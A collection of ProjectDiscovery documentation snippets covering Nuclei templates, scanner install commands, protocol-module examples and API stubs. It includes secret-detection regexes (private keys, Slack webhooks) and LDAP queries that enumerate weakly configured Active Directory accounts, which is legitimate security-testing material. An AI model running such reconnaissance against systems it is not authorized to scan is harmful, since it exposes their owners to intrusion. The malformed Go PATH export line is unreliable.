katana_response/index.txt\n\nkatana_response/example.com/327c3fda87ce286848a574982ddd0b7c7487f816.txt https://example.com (200 OK)\nkatana_response/www.iana.org/bfc096e6dd93b993ca8918bf4c08fdc707a70723.txt http://www.iana.org/domains/reserved (200 OK)\n```\n\n----------------------------------------\n\nTITLE: Adding Go bin path to system path on Unix-like systems\nDESCRIPTION: These commands add the Go bin path to the system path on OSX or Linux, allowing easy access to installed Go binaries.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/install.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\necho export $PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with Hyphenated Properties\nDESCRIPTION: Example of using CSSType with both camelCase and kebab-case (hyphenated) CSS properties. It demonstrates how to extend the Properties interface.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_7\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\ninterface Style extends CSS.Properties, CSS.PropertiesHyphen {}\n\nconst style: Style = {\n  'flex-grow': 1,\n  'flex-shrink': 0,\n  'font-weight': 'normal',\n  backgroundColor: 'white',\n};\n```\n\n----------------------------------------\n\nTITLE: LDAP Metadata Collection\nDESCRIPTION: Collects metadata from the LDAP server.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst metadata = client.CollectMetadata();\nlog(to_json(metadata));\n```\n\n----------------------------------------\n\nTITLE: Reloading ZSH Configuration After PATH Update\nDESCRIPTION: Command to reload the ZSH shell configuration after updating the PATH environment variable.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nsource ~/.zshrc\n```\n\n----------------------------------------\n\nTITLE: NPM Build Commands\nDESCRIPTION: Lists the available npm commands for building, testing, and maintaining the project, including type generation, continuous build watching, testing, and code quality checks.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\nnpm run build\nnpm run watch\nnpm run test\nnpm run lazy\n```\n\n----------------------------------------\n\nTITLE: Template Digest Example\nDESCRIPTION: Shows the format of a template digest containing signature and fragment in YAML format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/template-signing.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# digest: 4a0a00473045022100eb01da6b97893e7868c584f330a0cd52df9bddac005860bb8595ba5b8aed58c9022050043feac68d69045cf320cba9298a2eb2e792ea4720d045d01e803de1943e7d:4a3eb6b4988d95847d4203be25ed1d46\n```\n\n----------------------------------------\n\nTITLE: Including Help Cards Component in Markdown\nDESCRIPTION: MDX snippet inclusion for displaying help resource cards in the documentation\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/help/home.mdx#2025-04-12_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n<Snippet file=\"help-cards.mdx\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring Tailwind CSS IntelliSense for clsx\nDESCRIPTION: JSON configuration for enabling Tailwind CSS class autocompletion with clsx in Visual Studio Code.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/clsx/readme.md#2025-04-12_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n \"tailwindCSS.experimental.classRegex\": [\n   [\"clsx\\\\(([^)]*)\\\\)\", \"(?:'|\\\"|`)([^']*)(?:'|\\\"|`)\"]\n ]\n}\n```\n\n----------------------------------------\n\nTITLE: Receiving Partial Hex Data\nDESCRIPTION: Example of receiving partial data in hexadecimal format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.RecvHex(1024);\n```\n\n----------------------------------------\n\nTITLE: Configuring Global Matchers in YAML Template\nDESCRIPTION: YAML configuration for global matchers that detect asymmetric private keys and Slack webhooks across all HTTP requests. The template uses regex patterns to identify sensitive information in response bodies.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - global-matchers: true\n    matchers-condition: or\n    matchers:\n      - type: regex\n        name: asymmetric_private_key\n        regex:\n          - '-----BEGIN ((EC|PGP|DSA|RSA|OPENSSH) )?PRIVATE KEY( BLOCK)?-----'\n        part: body\n\n      - type: regex\n        name: slack_webhook\n        regex:\n          - >-\n            https://hooks.slack.com/services/T[a-zA-Z0-9_]{8,10}/B[a-zA-Z0-9_]{8,12}/[a-zA-Z0-9_]{23,24}\n        part: body\n```\n\n----------------------------------------\n\nTITLE: Defining IKEv2 Notification Type Constants in TypeScript\nDESCRIPTION: Constants for IKEv2 notification types including No Proposal Chosen (14) and Use Transport Mode (16391).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ikev2.mdx#2025-04-12_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\nconst IKE_NOTIFY_NO_PROPOSAL_CHOSEN: 14\nconst IKE_NOTIFY_USE_TRANSPORT_MODE: 16391\n```\n\n----------------------------------------\n\nTITLE: Defining SQLResult Interface Properties in TypeScript\nDESCRIPTION: Interface definition for SQLResult with two optional properties: Columns (string array) and Count (number). This interface is used to structure MySQL query results with column information and result count.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.SQLResult.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SQLResult {\n    Columns?: string[];\n    Count?: number;\n}\n```\n\n----------------------------------------\n\nTITLE: IsPOP3Response Interface Definition in TypeScript\nDESCRIPTION: TypeScript interface definition for POP3 response structure containing optional Banner string and IsPOP3 boolean properties. Used to type-check responses from POP3 connection attempts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/pop3.IsPOP3Response.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ninterface IsPOP3Response {\n  Banner?: string;  // Defined in pop3.ts:32\n  IsPOP3?: boolean;  // Defined in pop3.ts:30\n}\n```\n\n----------------------------------------\n\nTITLE: Defining LibDefaults Interface Properties in TypeScript\nDESCRIPTION: This snippet defines the properties of the LibDefaults interface, including various configuration options for Kerberos authentication and behavior. It includes settings for encryption types, default realms, DNS lookups, and other Kerberos-related parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.LibDefaults.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface LibDefaults {\n  AllowWeakCrypto?: boolean;\n  CCacheType?: number;\n  Canonicalize?: boolean;\n  Clockskew?: number; // time in nanoseconds\n  DNSCanonicalizeHostname?: boolean;\n  DNSLookupKDC?: boolean;\n  DNSLookupRealm?: boolean;\n  DefaultClientKeytabName?: string;\n  DefaultKeytabName?: string;\n  DefaultRealm?: string;\n  DefaultTGSEnctypeIDs?: number[];\n  DefaultTGSEnctypes?: string[];\n  DefaultTktEnctypeIDs?: number[];\n  DefaultTktEnctypes?: string[];\n  ExtraAddresses?: Uint8Array;\n  Forwardable?: boolean;\n  IgnoreAcceptorHostname?: boolean;\n  K5LoginAuthoritative?: boolean;\n  K5LoginDirectory?: string;\n  KDCDefaultOptions?: BitString;\n  KDCTimeSync?: number;\n  NoAddresses?: boolean;\n  PermittedEnctypeIDs?: number[];\n  PermittedEnctypes?: string[];\n  PreferredPreauthTypes?: number[];\n  Proxiable?: boolean;\n  RDNS?: boolean;\n  RealmTryDomains?: number;\n  RenewLifetime?: number; // time in nanoseconds\n  SafeChecksumType?: number;\n  TicketLifetime?: number; // time in nanoseconds\n  UDPPreferenceLimit?: number;\n  VerifyAPReqNofail?: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Time Delay Analyzer in YAML\nDESCRIPTION: Configuration for time delay analyzer with customizable parameters including sleep duration, request limits, and error ranges for time correlation and slope.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/fuzzing-overview.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nanalyzer:\n  name: time_delay\n  parameters:\n    sleep_duration: 10 # sleep for 10 seconds (default: 5)\n    requests_limit: 6 # make 6 verification requests (default: 4)\n    time_correlation_error_range: 0.30 # error range for time correlation (default: 0.15)\n    time_slope_error_range: 0.40 # error range for time slope (default: 0.30)\n```\n\n----------------------------------------\n\nTITLE: Creating a New GoConsolePrinter in TypeScript\nDESCRIPTION: The NewGoConsolePrinter function creates and returns a new instance of the GoConsolePrinter class. This function is defined in goconsole.ts at line 6.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/goconsole.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\nNewGoConsolePrinter(): GoConsolePrinter\n```\n\n----------------------------------------\n\nTITLE: Querying AD Users with No Password Requirement - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users that do not require a password using FilterIsPerson and FilterPasswordNotRequired filters. Returns a SearchResult object containing matching users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst users = client.GetADUserWithPasswordNotRequired();\nlog(to_json(users));\n```\n\n----------------------------------------\n\nTITLE: Querying AD Users Trusted for Delegation - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users that are trusted for delegation using FilterIsPerson and FilterTrustedForDelegation filters. Returns a SearchResult object containing matching users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst users = client.GetADUserTrustedForDelegation();\nlog(to_json(users));\n```\n\n----------------------------------------\n\nTITLE: Using Custom Payload Length in Interactsh Client\nDESCRIPTION: Command to start Interactsh client with matching custom payload length settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_9\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-client -s hackwithautomation.com -cidl 4 -cidn 6\n```\n\n----------------------------------------\n\nTITLE: Implementing Request Conditions with DSL Matchers\nDESCRIPTION: Shows how to create conditions between multiple HTTP requests in Nuclei using DSL matchers with numeric suffixes to reference previous request responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n    matchers:\n      - type: dsl\n        dsl:\n          - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\"\n```\n\n----------------------------------------\n\nTITLE: Defining Ticket Interface Properties in TypeScript\nDESCRIPTION: This snippet defines the properties of the Ticket interface for Kerberos authentication. It includes optional properties for ticket version, realm, encrypted and decrypted parts, and service name.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.Ticket.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Ticket {\n  TktVNO?: number;\n  Realm?: string;\n  EncPart?: EncryptedData;\n  DecryptedEncPart?: EncTicketPart;\n  SName?: PrincipalName;\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Uncover Usage with stdin Input\nDESCRIPTION: Demonstrates the basic usage of uncover tool with stdin input to search for SSL certificates from Uber Technologies using the default Shodan engine.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\necho 'ssl:\"Uber Technologies, Inc.\"' | uncover\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei with Global Matchers\nDESCRIPTION: Command-line example showing how to run Nuclei with global matchers enabled (-egm flag) against multiple templates. The output shows matches found across different template requests.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_11\n\nLANGUAGE: console\nCODE:\n```\n> nuclei -egm -u http://example.com -t http-template-with-global-matchers.yaml -t http-template-1.yaml -t http-template-2.yaml -silent\n[http-template-with-global-matchers:asymmetric_private_key] http://example.com/request-from-http-template-1\n[http-template-with-global-matchers:slack_webhook] http://example.com/request-from-http-template-2\n```\n\n----------------------------------------\n\nTITLE: Installing Subfinder from GitHub\nDESCRIPTION: These commands clone the Subfinder repository, build the binary, and move it to the system path. It requires the latest version of Go.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/projectdiscovery/subfinder.git; \\\ncd subfinder/v2/cmd/subfinder; \\\ngo build; \\\nmv subfinder /usr/local/bin/; \\\nsubfinder -version;\n```\n\n----------------------------------------\n\nTITLE: Connecting to SSH Server with Private Key in JavaScript\nDESCRIPTION: Connects to an SSH server using a private key instead of a password. Returns a boolean indicating success.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nconst privateKey = `-----BEGIN RSA PRIVATE KEY----- ...`;\nconst connected = client.ConnectWithKey('acme.com', 22, 'username', privateKey);\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Definition for GET Integration by Name Endpoint\nDESCRIPTION: OpenAPI specification for the GET /v1/integration/{name} endpoint that retrieves information about a specific integration by its name. The endpoint path includes a name parameter that serves as the integration identifier.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-integration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/integration/{name}\n```\n\n----------------------------------------\n\nTITLE: Executing MySQL Query in JavaScript\nDESCRIPTION: Connects to a MySQL database and executes a query. Returns an SQLResult object containing the query results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst result = mysql.ExecuteQuery('acme.com', 3306, 'username', 'password', 'SELECT * FROM users');\nlog(to_json(result));\n```\n\n----------------------------------------\n\nTITLE: Initializing HTTP Request Block in Nuclei Template\nDESCRIPTION: Starts the HTTP requests section in a Nuclei template, which is the foundation for HTTP-based security scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Start the requests for the template right here\nhttp:\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Team Member Deletion\nDESCRIPTION: YAML definition for the DELETE endpoint to remove a team member from a user's team. Uses REST API path parameter structure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/delete-team-member.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/user/team/member\n```\n\n----------------------------------------\n\nTITLE: Setting Chaos API Key Environment Variable\nDESCRIPTION: Command to set the Chaos API key as an environment variable in the bash profile for persistent authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nexport CHAOS_KEY=CHAOS_API_KEY\n```\n\n----------------------------------------\n\nTITLE: Installing Cloudlist via Go\nDESCRIPTION: This command installs the latest version of Cloudlist using Go. It requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/cloudlist/cmd/cloudlist@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Asset Enumeration Deletion Endpoint\nDESCRIPTION: YAML declaration specifying the OpenAPI endpoint for deleting asset enumeration data. The endpoint is defined as DELETE /v1/asset/enumerate.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/delete-bulk-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/asset/enumerate\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for DELETE /v1/scans/schedule Endpoint\nDESCRIPTION: OpenAPI specification defining the DELETE /v1/scans/schedule endpoint for removing scheduled scans.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-scan-schedule.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /v1/scans/schedule\n```\n\n----------------------------------------\n\nTITLE: Initializing PostgreSQL Client\nDESCRIPTION: Creates a new instance of PGClient class for interacting with PostgreSQL databases.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.PGClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Template Statistics\nDESCRIPTION: YAML definition specifying the OpenAPI endpoint path and method for retrieving template statistics.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-public-template-stats.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/stats\n```\n\n----------------------------------------\n\nTITLE: Installing Mintlify CLI for ProjectDiscovery Documentation Development\nDESCRIPTION: This command installs the latest version of Mintlify CLI globally using npm. Mintlify is used for local development of the ProjectDiscovery documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm i -g mintlify@latest\n```\n\n----------------------------------------\n\nTITLE: Uploading httpx Results to Existing Asset Group in Console\nDESCRIPTION: This command shows how to upload new assets discovered by httpx to an existing asset group in the PDCP UI Dashboard.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ chaos -d hackerone.com | httpx -dashboard -aid existing-asset-id\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for Asset Removal in OpenAPI Specification\nDESCRIPTION: OpenAPI specification for deleting a specific asset by its ID using the DELETE HTTP method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/delete-asset.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/assets/{asset_Id}\n```\n\n----------------------------------------\n\nTITLE: Binary download URL for httpx\nDESCRIPTION: Direct URL to download pre-compiled binary releases of httpx.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/httpx/releases\n```\n\n----------------------------------------\n\nTITLE: Downloading dnsx binary\nDESCRIPTION: This URL provides access to the latest binary releases of dnsx for various operating systems. Users need to download and unzip the appropriate binary for their OS.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/install.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/dnsx/releases\n```\n\n----------------------------------------\n\nTITLE: Handling falsey values in clsx\nDESCRIPTION: Example showing how clsx handles falsey values and standalone boolean values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/clsx/readme.md#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nclsx(true, false, '', null, undefined, 0, NaN);\n//=> ''\n```\n\n----------------------------------------\n\nTITLE: Installing CSSType via npm\nDESCRIPTION: Command to install the CSSType library using npm package manager.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n$ npm install csstype\n```"
  }
]